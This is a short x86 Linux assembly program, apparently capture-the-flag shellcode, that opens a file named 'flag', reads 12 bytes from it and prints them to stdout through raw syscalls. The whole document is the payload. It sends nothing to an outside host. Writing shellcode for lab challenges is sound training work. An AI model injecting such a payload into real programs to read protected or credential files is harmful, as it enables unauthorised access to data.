global _start
section .text
    _start:
        xor eax, eax
        push eax
        push 0x67616c66     ; 'flag'
        mov eax, 5          ; 'open' syscall
        mov ebx, esp        ; char *filename
        xor ecx, ecx        ; int flags (O_RDONLY)
        xor edx, edx        ; int mode
        int 0x80

        mov ebx, eax        ; fd
        mov eax, 3          ; 'read' syscall
        mov ecx, esp        ; char *buf
        mov edx, 12         ; size
        int 0x80

        mov edx, eax        ; size read
        mov eax, 4          ; syscall number for 'write'
        mov ebx, 1          ; fd = stdout
        mov ecx, esp        ; char *buf
        int 0x80

        mov eax, 1          ; 'exit' syscall
        xor ebx, ebx        ; return 0
        int 0x80
